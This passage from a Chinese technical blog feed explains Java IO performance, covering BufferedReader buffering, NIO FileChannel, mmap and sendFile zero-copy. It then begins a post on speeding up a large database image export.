class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fill()private void fill() throws IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   int dst;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (markedChar &amp;lt;= UNMARKED) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        /* No mark */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        dst = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        /* Marked */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int delta = nextChar - markedChar;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (delta &amp;gt;= readAheadLimit) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            /* Gone past read-ahead limit: Invalidate mark */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            markedChar = INVALIDATED;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            readAheadLimit = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            dst = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if (readAheadLimit &amp;lt;= cb.length) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                /* Shuffle in the current buffer */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                System.arraycopy(cb, markedChar, cb, 0, delta);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                markedChar = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dst = delta;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                /* Reallocate buffer to accommodate read-ahead limit */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                char ncb[] = new char[readAheadLimit];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                System.arraycopy(cb, markedChar, ncb, 0, delta);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cb = ncb;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                markedChar = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                dst = delta;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nextChar = nChars = delta;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    do &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n = in.read(cb, dst, cb.length - dst);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; while (n == 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (n &amp;gt; 0) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nChars = dst + n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nextChar = dst;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;&lt;strong&gt;核心方法fill()：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.字符缓冲输入流，底层有一个8192个元素的缓冲字符数组，当缓冲区的内容读完时，将使用 fill() 方法从硬盘中读取数据填充缓冲数组；&lt;/p&gt;
&lt;p&gt;2.字符缓冲输出流，底层有一个8192个元素的缓冲字符数组，使用flush方法将缓冲数组中的内容写入到硬盘当中；&lt;/p&gt;
&lt;p&gt;3.使用缓冲数组之后，程序在运行的大部分时间内都是内存和内存直接的数据交互过程。内存直接的操作效率是比较高的。并且降低了CPU通过内存操作硬盘的次数；&lt;/p&gt;
&lt;p&gt;4.关闭字符缓冲流，都会首先释放对应的缓冲数组空间，并且关闭创建对应的字符输入流和字符输出流。&lt;/p&gt;
&lt;p&gt;既然缓冲这么好用，为啥jdk将缓冲字符数组设置的这么小，才8192个字节？这是一个比较折中的方案，如果缓冲区太大的话，就会增加单次读写的时间，同样内存的大小也是有限制的，不可能都让你来干这个一件事。&lt;/p&gt;
&lt;p&gt;很多小伙伴也肯定用过它的read(char[] cbuf)，它内部维护了一个char数组，每次写/读数据时，操作的是数组，这样可以减少IO次数。&lt;br&gt;&lt;img src=&#34;/img/2024/20240506.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）buffer四大属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.mark：标记&lt;/p&gt;
&lt;p&gt;2.position：位置，下一个要被读或写的元素的索引， 每次读写缓冲区数据时都会改变改值， 为下次读写作准备&lt;/p&gt;
&lt;p&gt;3.limit：表示缓冲区的当前终点，不能对缓冲区 超过极限的位置进行读写操作。且极限 是可以修改的&lt;/p&gt;
&lt;p&gt;4.capacity：容量，即可以容纳的最大数据量；在缓 冲区创建时被设定并且不能改变。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、缓冲流：4次上下文切换+4次拷贝&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;传统IO执行的话需要4次上下文切换（用户态-&amp;gt;内核态-&amp;gt;用户态-&amp;gt;内核态-&amp;gt;用户态）和4次拷贝。&lt;/p&gt;
&lt;p&gt;1.磁盘文件DMA拷贝到内核缓冲区&lt;/p&gt;
&lt;p&gt;2.内核缓冲区CPU拷贝到用户缓冲区&lt;/p&gt;
&lt;p&gt;3.用户缓冲区CPU拷贝到Socket缓冲区&lt;/p&gt;
&lt;p&gt;4.Socket缓冲区DMA拷贝到协议引擎。&lt;br&gt;&lt;img src=&#34;/img/2024/20240508.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;五、NIO之FileChannel&#34;&gt;&lt;a href=&#34;#五、NIO之FileChannel&#34; class=&#34;headerlink&#34; title=&#34;五、NIO之FileChannel&#34;&gt;&lt;/a&gt;五、NIO之FileChannel&lt;/h4&gt;&lt;p&gt;NIO中比较常用的是FileChannel，主要用来对本地文件进行 IO 操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、FileChannel 常见的方法有&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.read，从通道读取数据并放到缓冲区中；&lt;/p&gt;
&lt;p&gt;2.write，把缓冲区的数据写到通道中；&lt;/p&gt;
&lt;p&gt;3.transferFrom，从目标通道 中复制数据到当前通道；&lt;/p&gt;
&lt;p&gt;4,transferTo，把数据从当 前通道复制给目标通道。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、关于Buffer 和 Channel的注意事项和细节&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.ByteBuffer支持类型化的put和get, put放入的是什么数据类型，get就应该使用 相应的数据类型来取出，否则可能有 BufferUnderflowException 异常；&lt;/p&gt;
&lt;p&gt;2.可以将一个普通Buffer 转成只读Buffer；&lt;/p&gt;
&lt;p&gt;3.NIO 还提供了 MappedByteBuffer， 可以让文件直接在内存（堆外的内存）中进 行修改， 而如何同步到文件由NIO 来完成；&lt;/p&gt;
&lt;p&gt;4.NIO 还支持 通过多个 Buffer (即 Buffer 数组) 完成读写操作，即 Scattering 和 Gathering。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、Selector(选择器)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Java的NIO，用非阻塞的IO方式。可以用一个线程，处理多个的客户端连 接，就会使用到Selector(选择器)；&lt;/p&gt;
&lt;p&gt;2.Selector 能够检测多个注册的通道上是否有事件发生，如果有事件发生，便获取事件然 后针对每个事件进行相应的处理。这样就可以只用一个单线程去管理多个 通道，也就是管理多个连接和请求。&lt;/p&gt;
&lt;p&gt;3.只有在 连接/通道 真正有读写事件发生时，才会进行读写，就大大地减少了系统开销，并且不必为每个连接都创建一个线程，不用去维护多个线程。&lt;/p&gt;
&lt;p&gt;4,避免了多线程之间的上下文切换导致的开销。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4、selector的相关方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.open();//得到一个选择器对象&lt;/p&gt;
&lt;p&gt;2.select(long timeout);//监控所有注册的通道，当其中有IO操作可以进行时，将 对应的SelectionKey加入到内部集合中并返回，参数用来设置超时时间&lt;/p&gt;
&lt;p&gt;3.selectedKeys();//从内部集合中得到所有的SelectionKey。&lt;/p&gt;
&lt;h4 id=&#34;六、内存映射技术mmap&#34;&gt;&lt;a href=&#34;#六、内存映射技术mmap&#34; class=&#34;headerlink&#34; title=&#34;六、内存映射技术mmap&#34;&gt;&lt;/a&gt;六、内存映射技术mmap&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;1、文件映射&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;传统的文件I/O操作可能会变得很慢，这时候mmap就闪亮登场了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mmap（Memory-mapped files）是一种在内存中创建映射文件的机制，它可以使我们像访问内存一样访问文件，从而避免频繁的文件I/O操作。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用mmap的方式是在内存中创建一个虚拟地址，然后将文件映射到这个虚拟地址上，这个映射的过程是由操作系统完成的。&lt;/p&gt;
&lt;p&gt;实现映射后，进程就可以采用指针的方式读写操作这一段内存，系统会自动回写到对应的文件磁盘上，这样就完成了对文件的读取操作，而不用调用 read、write 等系统函数。&lt;/p&gt;
&lt;p&gt;内核空间对这段区域的修改也会直接反映用户空间，从而可以实现不同进程间的文件共享。&lt;br&gt;&lt;img src=&#34;/img/2024/20240509.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、Java中使用mmap&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在Java中，mmap技术主要使用了JavaNIO（New IO）库中的FileChannel 类，它提供了一种将文件映射到内存的方法，称为MappedByteBuffer。MappedByteBuffe是ByteBuffer的一个子类，它扩展了ByteBuffer的功能，可以直接将文件映射到内存中。&lt;/p&gt;
&lt;p&gt;根据文件地址创建了一层缓存当作索引，放在虚拟内存中，使用时会根据的地址，直接找到磁盘中文件的位置，把数据分段load到系统内存(pagecache)中。&lt;br&gt;&lt;img src=&#34;/img/2024/20240510.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public static String readFileByMmap(String filePath) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    File file = new File(filePath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String ret = &amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    StringBuilder builder = new StringBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try (FileChannel channel = new RandomAccessFile(file, &amp;quot;r&amp;quot;).getChannel()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        long size = channel.size();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 创建一个与文件大小相同的字节数组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ByteBuffer buffer = ByteBuffer.allocate((int) size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 将通道上的所有数据都读入到buffer中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while (channel.read(buffer) != -1) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 切换为只读模式&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        buffer.flip();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 从buffer中获取数据并处理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        byte[] data = new byte[buffer.remaining()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        buffer.get(data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ret = new String(data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; catch (IOException e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&amp;quot;readFileByMmap异常：&amp;quot; + e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;3、内存映射技术mmap：4次上下文切换+3次拷贝&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;mmap是一种内存映射技术，mmap相比于传统的缓冲流来说，其实就是少了1次CPU 拷贝，变成了数据共享。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;虽然减少了一次拷贝，但是上下文切换的次数还是没变。&lt;/p&gt;
&lt;p&gt;因为存在一次CPU拷贝，因此mmap并不是严格意义上的零拷贝。&lt;/p&gt;
&lt;p&gt;RocketMQ 中就是使用的 mmap 来提升磁盘文件的读写性能。&lt;br&gt;&lt;img src=&#34;/img/2024/20240511.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;七、sendFile零拷贝&#34;&gt;&lt;a href=&#34;#七、sendFile零拷贝&#34; class=&#34;headerlink&#34; title=&#34;七、sendFile零拷贝&#34;&gt;&lt;/a&gt;七、sendFile零拷贝&lt;/h4&gt;&lt;p&gt;零拷贝将上下文切换和拷贝的次数压缩到了极致。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、传统IO流&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.将磁盘中的文件拷贝到内核空间内存；&lt;/p&gt;
&lt;p&gt;2.将内核空间的内容拷贝到用户空间内存；&lt;/p&gt;
&lt;p&gt;3.用户空间将内容写入到内核空间内存；&lt;/p&gt;
&lt;p&gt;4.socket读取内核空间内存，将内容发送给第三方服务器。&lt;br&gt;&lt;img src=&#34;/img/2024/20240512.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、sendFile零拷贝&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在内核的支持下，零拷贝少了一个步骤，那就是内核缓存向用户空间的拷贝，这样既节省了内存，也节省了 CPU 的调度时间，让效率更高。&lt;br&gt;&lt;img src=&#34;/img/2024/20240513.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、sendFile零拷贝：2 次上下文切换 + 2次拷贝&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;直接将用户缓冲区干掉，而且没有CPU拷贝，故得名零拷贝。&lt;/strong&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240514.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重置优化4：通过零拷贝读取文件&lt;/strong&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/20240515.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;八、总结经过&#34;&gt;&lt;a href=&#34;#八、总结经过&#34; class=&#34;headerlink&#34; title=&#34;八、总结经过&#34;&gt;&lt;/a&gt;八、总结经过&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;4次优化，将页面的加载时间控制在了1秒以内，实打实的提升了程序的秒开率。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.批量查询时，不查询BLOB大字段；&lt;/p&gt;
&lt;p&gt;2.点击运费查询时，单独查询+触发索引，实现“懒加载”；&lt;/p&gt;
&lt;p&gt;3.异步存储文件&lt;/p&gt;
&lt;p&gt;4.通过缓冲流-&amp;gt;内存映射技术mmap-&amp;gt; sendFile零拷贝读取本地文件；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过一次页面优化，收获颇丰：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.通过业务优化，将BLOB大字段进行“懒加载”；&lt;/p&gt;
&lt;p&gt;2.异步存储文件；&lt;/p&gt;
&lt;p&gt;3.系统的学习了Java IO流，输入输出流、字符流、字符流、转换流；&lt;/p&gt;
&lt;p&gt;4.通过NIO的FileChannel读取文件时，较于缓冲流性能上显著提升；&lt;/p&gt;
&lt;p&gt;5.内存映射技术mmap 相比于传统的 缓冲流 来说，其实就是少了1次内核缓冲区到用户缓冲区的CPU拷贝，将其变成了数据共享；&lt;/p&gt;
&lt;p&gt;6.sendFile零拷贝，舍弃了用户空间内存，舍弃了CUP拷贝，完美的零拷贝方案。&lt;/p&gt;
&lt;p&gt;7.通过代码实例，横向对比了FileReader、BufferedReader、NIO之FileChannel、内存映射技术mmap、sendFile零拷贝之间的性能差距；&lt;/p&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/kaogMK5qz5vkfs9-BYu0Mg&#34;&gt;哪吒编程&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/05/06/index-asynchrony-landing/</guid>
            <title>增加索引 + 异步 + 不落地后，从 12h 优化到 15 min</title>
            <link>https://erik.xyz/2024/05/06/index-asynchrony-landing/</link>
            <category>web</category>
            <category>优化</category>
            <pubDate>Mon, 06 May 2024 11:44:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;在开发中，我们经常会遇到这样的需求，将数据库中的图片导出到本地，再传给别人。&lt;/p&gt;
&lt;h4 id=&#34;一、一般我会这样做：&#34;&gt;&lt;a href=&#34;#一、一般我会这样做：&#34; class=&#34;headerlink&#34; title=&#34;一、一般我会这样做：&#34;&gt;&lt;/a&gt;一、一般我会这样做：&lt;/h4&gt;&lt;p&gt;1.通过接口或者定时任务的形式&lt;/p&gt;
&lt;p&gt;2.读取Oracle或者MySQL数据库&lt;/p&gt;
&lt;p&gt;3.通过FileOutputStream将Base64解密后的byte[]存储到本地&lt;/p&gt;
&lt;p&gt;4.遍历本地文件夹，将图片通过FTP上传到第三方服务器&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/202405100.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;现场炸锅了！&lt;/p&gt;
&lt;p&gt;实际的数据量非常大，据统计差不多有400G的图片需要导出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;现场人员的反馈是，已经跑了12个小时了，还在继续，不知道啥时候能导完。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;停下来呢？之前的白导了，不停呢？不知道要等到啥时候才能导完。&lt;/p&gt;
&lt;p&gt;这不行啊，速度太慢了，一个简单的任务，不能被这东西耗死吧？&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@Value(&amp;quot;$&amp;#123;months&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private String months;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Value(&amp;quot;$&amp;#123;imgDir&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private String imgDir;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Resource&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private UserDao userDao;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public void getUserInfoImg() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 获取需要导出的月表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  String[] monthArr = months.split(&amp;quot;,&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for (int i = 0; i &amp;lt; monthArr.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   // 获取月表中的图片&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   Map&amp;lt;String, Object&amp;gt; map = new HashMap&amp;lt;String, Object&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   String tableName = &amp;quot;USER_INFO_&amp;quot; + monthArr[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   map.put(&amp;quot;tableName&amp;quot;, 